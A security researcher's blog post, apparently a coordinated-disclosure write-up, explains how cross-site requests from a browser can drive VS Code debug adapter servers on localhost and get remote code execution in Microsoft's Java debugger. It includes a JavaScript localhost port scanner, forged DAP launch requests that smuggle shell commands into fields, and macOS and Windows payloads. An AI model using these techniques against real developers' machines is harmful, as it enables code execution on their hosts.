---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-07-28_csrfing-vs-codes-debug-adapter-protocol.md
original_filename: 2023-07-28_csrfing-vs-codes-debug-adapter-protocol.md
title: CSRFing VS Code's Debug Adapter Protocol
category: documents
detected_topics:
- supply-chain
- command-injection
- cors
- csrf
- access-control
- automation-abuse
tags:
- imported
- documents
- supply-chain
- command-injection
- cors
- csrf
- access-control
- automation-abuse
language: en
raw_sha256: 0bd237f8d25717e9b3741fafc5189e10b8bc903bd4ad27f868ea6893163d80e1
text_sha256: 9801753ae195c1311bdb8336322d0d7c8ccbd274ded80f5190585c10e201ceb9
ingested_at: '2026-06-28T07:32:24Z'
sensitivity: unknown
redactions_applied: false
---

# CSRFing VS Code's Debug Adapter Protocol

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-07-28_csrfing-vs-codes-debug-adapter-protocol.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, cors, csrf, access-control, automation-abuse
- Ingested At: 2026-06-28T07:32:24Z
- Redactions Applied: False
- Raw SHA256: `0bd237f8d25717e9b3741fafc5189e10b8bc903bd4ad27f868ea6893163d80e1`
- Text SHA256: `9801753ae195c1311bdb8336322d0d7c8ccbd274ded80f5190585c10e201ceb9`


## Content

---
title: "CSRFing VS Code's Debug Adapter Protocol"
url: "https://www.mcnulty.blog/posts/dap-csrf"
final_url: "https://www.mcnulty.blog/posts/dap-csrf"
authors: ["Dan McNulty (@_Z7mcnulty)"]
programs: ["Microsoft (VS Code)"]
bugs: ["CSRF", "RCE"]
publication_date: "2023-07-28"
added_date: "2023-08-08"
source: "pentester.land/writeups.json"
original_index: 897
---

## Summary

Local `debug adapter` TCP servers, deployed as part of a [Debug Adapter Protocol (DAP)](https://microsoft.github.io/debug-adapter-protocol) implementation used by [VS Code, Visual Studio and other development tools](https://microsoft.github.io/debug-adapter-protocol/implementors/tools/), are vulnerable to [cross-site request forgery (CSRF)](https://owasp.org/www-community/attacks/csrf) from malicious JavaScript executed in the IDE user's web browser. This CSRF vulnerability opens the door for the malicious JavaScript to execute exploits on the IDE user's host by sending arbitrary commands to the debug adapter.

This post provides a deep dive into the vulnerability and describes a proof-of-concept (PoC), one-click, runtime code execution (RCE) exploit, using the CSRF vulnerability as the first in the vulnerability chain.

### Coordinated Disclosures

I reported this vulnerability to the Microsoft Security Response Center (MSRC) in October 2022, which led to a one-click, remote code execution vulnerability being fixed in [the official Microsoft Java debugger support for VS Code](https://github.com/microsoft/vscode-java-debug) in version [`0.48.0`](https://github.com/microsoft/vscode-java-debug/releases/tag/0.48.0).

In May, I also reported a minor infinite loop issue in the [cppdap project](https://github.com/google/cppdap) that could be triggered using the same CSRF vulnerability. I fixed that issue [via a PR](https://github.com/google/cppdap/pull/115) shortly after the report, per guidance from Google's security team.

Lastly, I did report some other vulnerabilities to other projects that could be triggered via the CSRF vulnerability, but per their preferences, I am not discussing the details of those vulnerabilities here.

## Background

If you are already familiar with VS Code and the DAP, you can probably skip this background material and jump to Vulnerability Details.

### VS Code

[VS Code](https://code.visualstudio.com/) is an open source integrated development environment (IDE) developed by Microsoft. According to the [2023 Stack Overflow Developer Survey](https://survey.stackoverflow.co/2023/#section-most-popular-technologies-integrated-development-environment), "Visual Studio Code remains the preferred IDE across all developers". VS Code has strong support for JavaScript and related web technologies, making it particularly popular amongst web developers.

VS Code is at its core a TypeScript app, implemented on top of [Electron](https://www.electronjs.org/). It is highly extensible via its full-featured [extension API](https://code.visualstudio.com/api). Extensions are primarily installed from a [Microsoft-hosted marketplace](https://marketplace.visualstudio.com/vscode), where the most popular extensions have 10s of millions of downloads.

The extension API is core to how VS Code works and much of the native capabilities of VS Code are actually provided by extensions. Extensions implement all programming language-specific support. Microsoft itself develops and maintains many popular extensions.

Of particular relevance to this post, the extension API [allows extensions to integrate with a debugger](https://code.visualstudio.com/api/extension-guides/debugger-extension) via the [Debug Adapter Protocol](https://microsoft.github.io/debug-adapter-protocol), a generic protocol for interacting with a debugger and retrieving information used by VS Code's debugger UI.

### TL;DR: Debug Adapter Protocol (DAP)

I highly recommend reading the [overview page for DAP](https://microsoft.github.io/debug-adapter-protocol/overview) as that page has a ton of detail I won't rehash here. But as a TL;DR:

The DAP allows an IDE (such as VS Code) to _easily_ integrate with many different debugging engines as long as IDE extensions exist that adapt a debugging engine's native API into the generic form described by the DAP. The DAP originated with VS Code but is now [implemented by a number of IDEs and similar tools](https://microsoft.github.io/debug-adapter-protocol/implementors/tools/). From here on out, I'm going to assume VS Code is the IDE to make the analysis easier to follow.

A _debug adapter_ is a piece of code either running in VS Code as part of an extension or running in a separate process on the same host as VS Code that implements the DAP using a debugging engine's native APIs. The _client_ , VS Code, speaks DAP to the debug adapter to gather information for the VS Code debugger UI and to issue commands to the debugger engine, triggered by user interaction with the debugger UI.

VS Code [supports three types of deployment models for debug adapters](https://code.visualstudio.com/api/extension-guides/debugger-extension#alternative-approach-to-develop-a-debugger-extension):

  * **A** : The debug adapter is implemented entirely in the extension.
  * **B** : The debug adapter is launched as a separate process. VS Code writes to `stdin` and reads from `stdout` to communicate with the process.
  * **C** : The debug adapter is launched as a separate process. The debug adapter binds to a local port and VS Code opens a TCP connection to the local port.

For example, the following shows a simplified version of the type-C model, implemented by Microsoft's [Debugger for Java](https://github.com/microsoft/vscode-java-debug) extension.

![A flowchart with 6 steps illustrating how the Debugger for Java extension implements the DAP: Step 1: initialize the debug adapter. Step 2: start debug adapter process. Step 3: return network port for debug server. Step 4: Connect to port and send launch debuggee request. Step 5: invoke OS API to launch debuggee. Step 6: Use native Java debug interface to interact with debuggee ](/images/dap-csrf/java-dap.png)An illustration of the DAP implementation for the `Debugger for Java` VS Code extension.

The vulnerability described by this report requires that the debug adapter use a type-C deployment model.

### DAP Message Syntax

The DAP defines a message syntax that is used by VS Code for type-B and type-C deployment models. As described in the [overview](https://microsoft.github.io/debug-adapter-protocol/overview), both DAP participants send messages composed of one or more headers followed by JSON content of a length specified by the preceding `Content-Length` header. Individual header fields are terminated by a `\r\n` character sequence and the header fields are terminated by a line containing only the `\r\n` sequence.

Here's an example DAP `request` with the `\r\n` terminator sequences for the header fields included for clarity:
  
  
  Content-Length: 298\r\n
  \r\n
  {
  "seq": "1",
  "type": "request",
  "command": "launch",
  "arguments": {
  "noDebug": true,
  "launcherScript": "/bin/bash",
  "javaExec": "--init-file",
  "modulePaths": [
  "-c"
  ],
  "mainClass": "osascript -e 'display notification \"All your base are belong to us\"'"
  }
  }
  

If you are familiar with the HTTP/1.x message framing syntax, you may be able to guess where this is going 😅.

## Vulnerability Details

The CSRF vulnerability is made possible by combining the following properties of the communication between VS Code and the debug adapter:

  1. The DAP does not specify an authentication and/or authorization mechanism for the type-C deployment model so all connections to a debug adapter are implicitly trusted by the debug adapter.

  2. The message framing employed by the DAP is identical to the message framing utilized by HTTP/1.x messages.

These properties combine to allow cross-site HTTP requests to be sent by JavaScript running in the end user's web browser to be interpreted by the debug adapter as DAP commands.

### Exploit Recipe

Triggering the CSRF vulnerability and executing an exploit follows the general recipe:

  1. A developer uses VS Code to debug a program/integration/etc. resulting in a debug adapter TCP server listening for connections on the localhost.

  2. The developer context switches and navigates the web on their web browser. Through unspecified means, the developer's browser is navigated to a page with malicious JavaScript targeting the CSRF vulnerability.

  3. The malicious JavaScript scans the localhost for open ports that might be local debug adapter TCP servers.

  4. The JavaScript then makes cross-site POST requests to the possible DAP ports on the localhost, using a Content-Type of `text/plain` to avoid triggering [Cross-Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) preflight OPTIONS requests. The actual body content of the POST requests will be a DAP `request` containing the exploit. An example HTTP/1.1 request sent by the browser on behalf of the JavaScript is:
  
  POST / HTTP/1.1\r\n
  Host: localhost:3001\r\n
  Content-Length: 298\r\n
  Content-Type: text/plain;charset=UTF-8\r\n
  Origin: http://example.com:3001\r\n
  \r\n
  {
  "seq": "1",
  "type": "request",
  "command": "launch",
  "arguments": {
  "noDebug": true,
  "launcherScript": "/bin/bash",
  "javaExec": "--init-file",
  "modulePaths": [
  "-c"
  ],
  "mainClass": "osascript -e 'display notification \"All your base are belong to us\"'"
  }
  }
  

  5. The debug adapter parses the HTTP request as a valid DAP `request`, ignoring the request line and header fields in the request except `Content-Length`. Using the example from step 4, the DAP request would be parsed as:
  
  Content-Length: 298\r\n
  \r\n
  {
  "seq": "1",
  "type": "request",
  "command": "launch",
  "arguments": {
  "noDebug": true,
  "launcherScript": "/bin/bash",
  "javaExec": "--init-file",
  "modulePaths": [
  "-c"
  ],
  "mainClass": "osascript -e 'display notification \"All your base are belong to us\"'"
  }
  }
  

  6. The debug adapter executes the command, leading the debug adapter to execute the exploit contained in the payload.

### Classification

This vulnerability is [a well-known type of CSRF vulnerability](https://bugs.chromium.org/p/project-zero/issues/detail?id=693) where a malicious page can interact with servers running on the localhost or a locally accessible, private network.

These types of vulnerabilities are common enough and high impact that Google and others are actively working on a standard called [Private Network Access](https://wicg.github.io/private-network-access) to enhance browsers to use extensions to [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) to require locally running servers to opt-in to access from pages served from the public Internet.

### Impact

In theory, any DAP debug adapter that uses the type-C deployment model may contain this vulnerability. The exploits enabled by the vulnerability vary based on the capabilities and implementation of a particular debug adapter.

As demonstrated in the Proof of Concept Exploit section, the exploits enabled by this vulnerability for specific debug adapters can be quite serious! These exploits could be leveraged by an attacker to gain a foothold to then compromise the software supply chains accessible to the IDE end user.

### Root Cause Analysis

As mentioned in the beginning of this section, this vulnerability results from the combination of:

  1. the implied authorization to execute DAP commands of all connections made to the locally bound debug adapter TCP server
  2. DAP using the same messaging framing as HTTP/1.1

For the first aspect, if the debug adapter TCP server authenticated and authorized the connections as coming from VS Code, this vulnerability would not manifest because the JavaScript-initiated, cross-site connections would not meet these requirements.

For the second aspect, in theory, the DAP message parsers used by the debug adapters could be less lenient and mark the forged DAP request as invalid due to the HTTP/1.1 request not being a [valid DAP message](https://microsoft.github.io/debug-adapter-protocol/overview).

Changing either of these aspects in debug adapter implementations would eliminate this vulnerability. During the disclosure process, I observed both approaches being used to fix the vulnerability.

## Exploit Discovery

### A Promising Lead

I discovered this vulnerability while working on a VS Code extension for my new web browser for web developers, [GraySphere](https://graysphere.dev). I was investigating how some existing debugger extensions work. I noticed that some were spawning processes, and these processes were in turn opening locally-bound TCP ports.

Ever since reading [this bug report from Tavis Ormandy in 2016](https://bugs.chromium.org/p/project-zero/issues/detail?id=693), locally-bound TCP ports have piqued my interest. If that TCP port is running an HTTP server, particular care needs to be taken to prevent CSRF vulnerabilities similar to those described in the linked bug report.

After initial examination, it looked like those ports were not running HTTP servers. However, I kept digging, and discovered that they were debug adapter servers. I was not familiar with DAP, but I was generally curious so I started with the [overview](https://microsoft.github.io/debug-adapter-protocol/overview). It seemed similar to HTTP, particular due to its use of an almost identical syntax for header fields and message framing with `Content-Length`.

I started to run some experiments against these ports with `curl`. I started by sending some forged DAP requests as HTTP POST requests to the ports opened by the [built-in JS debugger](https://github.com/microsoft/vscode-js-debug). Surprisingly, I saw some error messages logged by the extension that seemed to indicate the request was being parsed as a DAP request.

I then loaded up the extension in a debugger using a "Hello, World!" project, and stepped through the following [DAP message parsing code](https://github.com/microsoft/vscode-js-debug/blob/175d9120d25005db7a66a2a67317c8ce406a6c6f/src/dap/transport.ts#L118):
  
  
  /*---------------------------------------------------------
  * Copyright (C) Microsoft Corporation. All rights reserved.
  *--------------------------------------------------------*/
  // License: https://github.com/microsoft/vscode-js-debug/blob/175d9120d25005db7a66a2a67317c8ce406a6c6f/LICENSE
  
  _handleData = (data: Buffer): void => {
  const receivedTime = new HrTime();
  this._rawData = Buffer.concat([this._rawData, data]);
  while (true) {
  if (this._contentLength >= 0) {
  if (this._rawData.length >= this._contentLength) {
  const message = this._rawData.toString('utf8', 0, this._contentLength);
  this._rawData = this._rawData.slice(this._contentLength);
  this._contentLength = -1;
  if (message.length > 0) {
  try {
  const msg: Message = JSON.parse(message);
  this.logger?.verbose(LogTag.DapReceive, undefined, {
  connectionId: this._connectionId,
  message: msg,
  });
  this.msgEmitter.fire({ message: msg, receivedTime });
  } catch (e) {
  console.error('Error handling data: ' + (e && e.message));
  }
  }
  continue; // there may be more complete messages to process
  }
  } else {
  const idx = this._rawData.indexOf(_TWO_CRLF);
  if (idx !== -1) {
  const header = this._rawData.toString('utf8', 0, idx);
  const lines = header.split('\r\n');
  for (let i = 0; i < lines.length; i++) {
  const pair = lines[i].split(/: +/);
  if (pair[0] === 'Content-Length') {
  this._contentLength = +pair[1];
  }
  }
  this._rawData = this._rawData.slice(idx + _TWO_CRLF.length);
  continue;
  }
  }
  break;
  }
  };
  }
  

The `_handleData` function is invoked whenever a debug adapter server connection receives data. The code attempts to first find the end of the DAP request header fields by searching for the first occurrence of `\r\n\r\n`. When this is found, it extracts the header fields and looks for the any `Content-Length` header fields. It uses the last `Content-Length` header field as the length for the request body and stores this in the `this._contentLength` variable. It then skips past the header fields in the input buffer.

When the `this._contentLength` is set, the body of the DAP request is expected to be available in the `this._rawData` buffer in the same invocation of `_handleData` or a future invocation `_handleData`.

So, this function effectively parses any HTTP request with a body whose length is defined by the `Content-Length` header field. This leads to the behavior described by the Exploit Recipe section.

However, in order for the forged request to result in an exploit, there needs to be a way for the forged request to avoid getting flagged as invalid. More on this topic in False Starts.

### From Idea to Exploit

At this point, I was able to code up a webpage that would use JavaScript to scan for open ports on the localhost (more on the scanning and identification of these ports later in Finding Local DAP Ports), and then use [`fetch`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) to send forged DAP requests to those ports.

A particularly powerful DAP request is the [`Launch` request](https://microsoft.github.io/debug-adapter-protocol/specification#Requests_Launch). This request instructs the debug adapter to launch a new process. The path to the executable and arguments to for the invocation of the executable are defined in the request. If I could get a debug adapter to handle a `Launch` request correctly, then the CSRF vulnerability would enable a RCE exploit.

Initially, I tried for a long time to develop an exploit for the [JS debugger](https://github.com/microsoft/vscode-js-debug). I then moved on to the [Python debugger](https://github.com/microsoft/debugpy). I was unsuccessful for both extensions. See the False Starts section for more information about those attempts.

At this point, I started searching Microsoft's repositories on GitHub for official VS Code extensions that could be vulnerable to a RCE exploit. I found the [Debugger for Java extension](https://github.com/microsoft/vscode-java-debug) used a `type-C` deployment model for its debug adapter so I started working on an exploit. As the Proof of Concept Exploit section shows, I successfully developed a RCE exploit for this extension.

## Proof of Concept Exploit

### Overview

In my report to Microsoft, I provided a Node module that served a static web page with some JS that sends the exploit to local debug adapters, after scanning the local host for possible candidates for DAP server ports.

Specifically, the package sends an exploit targeting the [Debugger for Java Extension](https://github.com/microsoft/vscode-java-debug), version `v0.47.0` and earlier. This exploit uses the above recipe to achieve remote code execution (RCE) by instructing the debug adapter to launch an arbitrary command with its arguments via Java's [Runtime.exec](https://devdocs.io/openjdk~8/java/lang/runtime#exec-java.lang.String-java.lang.String:A-java.io.File-) method.

I do not currently have plans to publish this package in an easy to consume format such as a GitHub repository because I don't have the bandwidth to support and answer further questions about it. However, in the following sections, I'll provide more details that may prove useful for those looking to set up defensive measures to detect similar exploits.

### Finding Local DAP Ports

The following JavaScript code is used to find local ports that _may_ be DAP debug adapters. It adapts a technique I found in Synk's [Deep dive into Visual Studio Code extension security vulnerabilities](https://snyk.io/blog/visual-studio-code-extension-security-vulnerabilities-deep-dive/) article.
  
  
  /**
  * Locates the candidates ports by issuing a request to all ports in the ephemeral port
  * range on the localhost. The debug adapters will silently discard the image requests
  * made by {@link tryPort} and leave the corresponding TCP connection open. This allows
  * this code to identify the debug adapter ports by timing out those connections.
  *
  * Scanning approach based on the technique documented here:
  * https://snyk.io/blog/visual-studio-code-extension-security-vulnerabilities-deep-dive/
  *
  * @returns an array of numbers, representing the ports that may be running a
  */
  async function locateDapCandidatePorts() {
  // Initiate the port scan without waiting for a result. This allows the
  // complete scan to take a only a few seconds.
  const scanStart = new Date().getTime();
  let portScans = {};
  for (
  let port = EPHEMERAL_PORT_START_DEFAULT;
  port <= EPHEMERAL_PORT_END_DEFAULT;
  port++
  ) {
  portScans[port] = tryPort(port).catch(() => false);
  }
  appendStatus('Initiated all connections to ephemeral ports');
  
  const currentStatus = statusElement.innerText;
  
  let candidatePorts = [];
  for (const port in portScans) {
  // Connections to candidate debug adapter ports will be held open by the
  // browser for a long period of time while connections to closed ports or
  // non-DAP ports will likely return an error almost immediately.
  //
  // As a result, identify candidate DAP ports by timing out the image load after 10
  // seconds.
  setStatus(currentStatus + '\n' + `Testing connection to port ${port}`);
  let timeout = delay(10000).then(() => true);
  if (await Promise.any([portScans[port], timeout])) {
  candidatePorts.push(port);
  }
  }
  const scanEnd = new Date().getTime();
  const elapsedSeconds = (scanEnd - scanStart) / 1000;
  appendStatus(`Completed scan in ${elapsedSeconds} seconds`);
  
  return candidatePorts;
  }
  
  /**
  * Generates a request to load an image from the specified port on localhost. A
  * success OR failure indicates that the port is not a debug adapter port because
  * the debug adapters will silently discard the GET request made by the browser
  * to retrieve the image and leave the corresponding connection open to wait for
  * more requests.
  *
  * The browser leaves these connections open for some amount
  * of time waiting for an HTTP response from the debug adapter that will never
  * be sent, which allows the detection of a debug adapter port using a simple timeout.
  *
  * @param {number} port the local port to scan
  */
  async function tryPort(port) {
  return new Promise((_, reject) => {
  const img = document.createElement('img');
  (img.onload = () => reject('Image loaded successfully?')),
  (img.onerror = () => reject('Image load failed')),
  (img.src = `http://127.0.0.1:${port}`);
  });
  }
  

As the inline comments state, the general approach is to use JavaScript to create `img` tags that attempt to load an image from a port on the localhost. If the image loads successfully or in error, that means that the port is not a DAP debug adapter port.

Loading an image from the local port will send a GET request to the port. The DAP message parser will discard the GET request because it does not contain the `Content-Length` header field, and as a result, the browser will leave the image request connection open, waiting for an HTTP response that will never be delivered. Given this behavior, DAP debug adapter ports can be identified by timing out an image request after 10 seconds or so.

With candidate ports in hand, exploit payloads can be sent to those ports via HTTP POST requests sent with [the `fetch` API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API).

#### Port Binding Behavior

Extensions that implement debug adapters bind the local ports when a debug session is initiated from VS Code. Once the debug session completes, the local port remains open. I suspect this behavior is for efficiency purposes to avoid the cost to rebind the port every time a debug session is started. It is also easier, from a code perspective, to not do any lifecycle management of the open port.

As a result, this exploit will work successfully as long as as the VS Code user has previously launched a debug session in the current invocation of VS Code.

### Debugger for Java Exploit

The exploit for the `Debugger for Java` extension works by crafting the arguments in the DAP `Launch` request in such a way that the arguments to [`Runtime.exec`](https://devdocs.io/openjdk~8/java/lang/runtime#exec-java.lang.String-java.lang.String:A-java.io.File-) are completely under attacker control.

The code that is parsing the `Launch` request lives in [java-debug](https://github.com/microsoft/java-debug), a library used by the `Debugger for Java` extension. Specifically, the most interesting code is:

  * [`LaunchWithoutDebuggingDelegate.launch`](https://github.com/microsoft/java-debug/blob/e0f2bd29a87eececabb2726f08d4d6d5479eb15b/com.microsoft.java.debug.core/src/main/java/com/microsoft/java/debug/core/adapter/handler/LaunchWithoutDebuggingDelegate.java#L51)
  * This code invokes `Runtime.exec`
  * [`LaunchRequestHandler.constructLaunchCommands`](https://github.com/microsoft/java-debug/blob/e0f2bd29a87eececabb2726f08d4d6d5479eb15b/com.microsoft.java.debug.core/src/main/java/com/microsoft/java/debug/core/adapter/handler/LaunchRequestHandler.java#L244)
  * This code parses the `Launch` request, doing some validation, to build an array of command line arguments to pass to `Runtime.exec`.

#### macos

The `Launch` request used by the exploit page for `macos` is:
  
  
  {
  "seq": "1",
  "type": "request",
  "command": "launch",
  "arguments": {
  "noDebug": true,
  "launcherScript": "/bin/bash",
  "javaExec": "--init-file",
  "modulePaths": ["-c"],
  "mainClass": "osascript -e 'display notification \"All your base are belong to us\"'"
  }
  }
  

Constructing the request in this way is required to get passed the validation performed by `LaunchRequestHandler.constructLaunchCommands`.

  1. The `noDebug` flag has the library select the `LaunchWithoutDebuggingDelegate` implementation, which has far less stringent requirements for the commands it will execute.
  2. The `launcherScript` property defines the first argument in the command line.
  * This value is set to `/bin/bash` as the actual command to run must be specified in the `mainClass` argument.
  3. The `javaExec` property defines the second argument in the command line and is required by `constructLaunchCommands` to skip over some code that includes a path to the `java` executable.
  * The [`--init-file` argument](https://www.gnu.org/software/bash/manual/bash.html#Invoking-Bash) is effectively a no-op to pass the validation while still constructing a valid command for bash. This command line argument to bash allows you to override the `.bashrc` used by the shell. If the file does not exist, it does not prevent bash from executing the command specified by the `-c` option.
  4. Validation applied earlier required that the `modulePaths` array be non-empty and set. In `constructLaunchCommands`, `--module-path` followed by the concatenation of `modulePaths` is added to the command line.

  * This part combines with the `--init-file` argument to create a no-op where `--init-file` is set to `--module-paths`. The `-c` is then added to the command line arguments to tell bash to invoke the command in the following string.

  1. The `mainClass` property defines the command that will actually be invoked.

When run on `macos`, the command executed is:
  
  
  /bin/bash --init-file --module-path -c 'osascript -e \'display notification "All your base are belong to us"\''
  

`osascript` is a command line utility that executes AppleScript. The command `display notification` generates an alert. When executed, the following notification is sent to the notification center.

![A macos Script Editor notification saying "All your base are belong to us"](/images/dap-csrf/alert.png)The alert shown when executing this exploit payload on macos.

#### Windows

A similar approach can be used to target Windows. Here's the payload:
  
  
  {
  "seq": "1",
  "type": "request",
  "command": "launch",
  "arguments": {
  "noDebug": true,
  "launcherScript": "C:\\Windows\\System32\\cmd.exe",
  "javaExec": "java",
  "modulePaths": ["/c"],
  "mainClass": "powershell -Command \"[void] [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); $objNotifyIcon=New-Object System.Windows.Forms.NotifyIcon; $objNotifyIcon.BalloonTipText='All your base are belong to us'; $objNotifyIcon.Icon=[system.drawing.systemicons]::Information; $objNotifyIcon.BalloonTipTitle='Notice'; $objNotifyIcon.BalloonTipIcon='None'; $objNotifyIcon.Visible=$True; $objNotifyIcon.ShowBalloonTip(5000);\""
  }
  }
  

This payload uses a similar approach as macos to have `Runtime.exec` to invoke the following command:
  
  
  C:\Windows\System32\cmd.exe java --module-path /c powershell -Command "[void] [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); $objNotifyIcon=New-Object System.Windows.Forms.NotifyIcon; $objNotifyIcon.BalloonTipText='All your base are belong to us'; $objNotifyIcon.Icon=[system.drawing.systemicons]::Information; $objNotifyIcon.BalloonTipTitle='Notice'; $objNotifyIcon.BalloonTipIcon='None'; $objNotifyIcon.Visible=$True; $objNotifyIcon.ShowBalloonTip(5000);"
  

I won't go into a ton of detail here, but the important part is that the attacker again has full control over the command passed to `powershell` via the `mainClass` property.

## Fixing the Vulnerability

### java-debug

[This commit in java-debug](https://github.com/microsoft/java-debug/commit/6e294e1e7c00014eb1b0ec1e67aa643efd97e19f) fixed the vulnerability by adding two additional validation checks for DAP requests:

  1. The DAP states that the first message an IDE should send to a debug adapter is an `Initialize` request. `java-debug` now only processes DAP requests such as the `Launch` request if it has first received an `Initialize` request. This will reject a single `Launch` request as invalid and mitigate the exploit I described earlier.
  2. `java-debug` now enforces that the `Content-Length` header field is the only header field in the DAP request. As a cross-site request from a browser will always contain more header fields, this is sufficient to mark cross-site requests as invalid.

A subtle point with this fix is that `java-debug` will still read the entire DAP request payload from the network connection before ignoring the invalid request. This is particularly important as it prevents multiple DAP requests from being smuggled in the HTTP POST body.

That is, if the parser just stopped parsing the DAP request after the invalid header fields, the HTTP POST body could contain an arbitrary sequence of now valid DAP requests. If this were to be allowed, the first validation check could be passed by a malicious payload.

### cppdap

In my research into other impacted debug adapters, I found that debug adapters that use [cppdap](https://github.com/google/cppdap) to create a `type-C` debug adapter would enter an infinite loop when receiving an invalid DAP message. Out of an abundance of caution, I reported this to Google as a security vulnerability and provided a patch.

A bit of [different approach was taken in fixing the issue in cppdap](https://github.com/google/cppdap/pull/115). Instead of ignoring invalid requests, the network connection is closed if the `Content-Lengeth` header field is not the only header field in the DAP message. This mitigates the request smuggling variation of exploits.

## Thanks!

I want to thank the following folks I interacted with as part of this work:

  * The MSRC team for confirming my report and the `java-debug` maintainers for fixing the vulnerability.
  * Google security for confirming my report and [Ben Clayton](https://github.com/ben-clayton) for reviewing my PR to cppdap.

## Future Work

As I alluded to in the Impact section, this vulnerability is theoretically present in any debug adapter that supports a local network deployment model. While I've reported issues to all the debug adapters I could find that have a meaningful exploit enabled by this vulnerability, there are a lot of debug adapter implementations!

One goal of writing this post was to get the word out about this vulnerability so debug adapter maintainers could audit their code and make any necessary fixes.

## Appendix: False Starts

I spent far too much time trying to develop exploits for the [vscode-js-debug](https://github.com/microsoft/vscode-js-debug) and [vscode-python](https://github.com/microsoft/vscode-python) extensions. I focused a lot of attention on these extensions because they are very popular, and they would be great for illustrating the broad impact of this vulnerability.

These extensions were more complicated in their processing of DAP requests in that they required the `Initialize` request to be the first request sent on a connection. To achieve a RCE using the `Launch` request, there would have to be some way to first send the `Initialize` request on the connection and then the `Launch` request.

As I mentioned in A Promising Lead, I initially the developed the exploits using `curl`. This was probably a mistake as it allowed me to leverage [Chunked Transfer Coding](https://www.rfc-editor.org/rfc/rfc9112.html#name-chunked-transfer-coding) to forge multiple DAP requests in a single HTTP POST request. If I could use a chunked request, there was an exploit recipe that would achieve RCE in the `vscode-js-debug` extension and the `vscode-python` extension.

Specifically, the HTTP request would look something like (`\r\n` included for illustration purposes):
  
  
  POST / HTTP/1.1[\r][\n]
  Host: localhost:8001[\r][\n]
  User-Agent: curl/7.79.1[\r][\n]
  Accept: */*[\r][\n]
  Transfer-Encoding: chunked[\r][\n]
  Content-Type: text/plain;charset=UTF-8[\r][\n]
  [\r][\n]
  2a9[\r][\n]
  Content-Length: 456[\r][\n]
  [\r][\n]
  {"command":"initialize","arguments":{"clientID":"vscode","clientName":"Visual Studio Code","adapterID":"pwa-node","pathFormat":"path","linesStartAt1":true,"columnsStartAt1":true,"supportsVariableType":true,"supportsVariablePaging":true,"supportsRunInTerminalRequest":true,"locale":"en-us","supportsProgressReporting":true,"supportsInvalidatedEvent":true,"supportsMemoryReferences":true,"supportsArgsCanBeInterpretedByShell":true},"type":"request","seq":1}[\r][\n]
  [\r][\n]
  Content-Length: 172[\r][\n]
  [\r][\n]
  {"seq":1000,"type":"request","command":"launch","arguments":{"type":"pwa-node","runtimeExecutable":"/usr/bin/touch","runtimeArgs":["/tmp/foo"],"nodeVersionHint":"v18.0.0"}}[\r][\n]
  [\r][\n]
  [\r][\n]
  0[\r][\n]
  [\r][\n]
  

The parsing code shown earlier will skip over the request header fields because there is no `Content-Length` header field. It will then read the first `chunk` as the header to the DAP request and determine that the length of the message content is specified in the `Content-Length` chunk data. The code then reads the next data chunk as the DAP message and processes it successfully. It continues on reading the data on the connection to process the next message and so on.

I initially was assuming that browsers could be told to use `chunked` `Transfer-Encoding`, but that turned out to not be the case. There was some discussion about using `chunked` encoding with the [Streams API](https://github.com/whatwg/fetch/issues/966) but the specification requires use of HTTP 2. I then spelunked through the source for Chromium and WebKit and did not find an instance where the browsers would send a `chunked` `Transfer-Encoding` request. So, this was a dead end.

However, perhaps there is a vector that utilizes something besides the browser? Who knows?

At this point, I'm moving on from this vulnerability, but do let me know if you end up doing any interesting follow-on research 😀.
